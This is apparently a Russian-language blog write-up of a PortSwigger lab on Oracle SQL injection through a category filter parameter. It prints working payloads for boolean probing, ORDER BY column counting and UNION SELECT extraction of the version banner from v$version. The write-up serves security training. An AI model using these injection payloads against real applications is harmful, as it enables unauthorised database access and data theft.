---
title: "SQL injection attack, querying the database type and version on Oracle"
date: 2025-06-06
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle"
classes: wide
---

В лабе есть уязвимость **SQL injection**. Для прохождения нужно отобразить версию БД.

```
https://0a11002e03d1573680d7176e00b80024.web-security-academy.net/
```

## Solution

Первым делом осмотрю страницу. В глаза бросается фильтр категорий:


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_SQL_injection_attack_querying_the_database_type_and_version_on_Oracle/1.png){: height="200" .align-center}


Категория передается через параметр `GET`-запроса:

```
https://0a11002e03d1573680d7176e00b80024.web-security-academy.net/filter?category=Accessories
```

Попробую покрутить данный параметр:

```
123'+or+true-- -error
123'+or+true-- -error
123'+or+1=1-- -ok
123'+or+1=0-- -ok
```

<details>
<summary>Пояснение</summary> 
  
<strong>SQL</strong> синтаксис и типы данных строго различаются. true — булево значение, без кавычек, а поле — строковое, поэтому возникает синтаксическая ошибка. 1=1 и 1=0 работают — логические операции с числами (не требуют кавычек). БД возвращает статус ok — значит, параметр обрамляется кавычками, и для инъекций нужно использовать числовые выражения, а не булевы напрямую.

</details>

`123'+or+1=0-- -` выдал пустую страницу, что соответствует моему ожиданию. Значит для обрамления используется `'`. 


Попробую узнать количество колонок с помощью `ORDER BY`:

```
' ORDER BY 1,2,3,4-- -err
' ORDER BY 1,2,3-- -err
' ORDER BY 1,2-- -OK
```

Значит в БД две колонки. 


Попробую использовать **UNION based injections**.

```
1' UNION SELECT 1, 2-- -err
1' UNION SELECT null, null-- -err
1' UNION SELECT '1', '2'-- -err
1' UNION SELECT '1', '2' FROM dual-- -ok
```


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_SQL_injection_attack_querying_the_database_type_and_version_on_Oracle/2.png){: height="200" .align-center}


Попробую вытащить версию. Нашел описание таблицы `v$version` на сайте [Oracle](https://docs.oracle.com/en//database/oracle/oracle-database/21/refrn/V-VERSION.html). Соберу пейлоад:

```
1' UNION SELECT 'version', BANNER FROM v$version-- -
```


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_SQL_injection_attack_querying_the_database_type_and_version_on_Oracle/3.png){: height="200" .align-center}


Лаба пройдена:3 ☕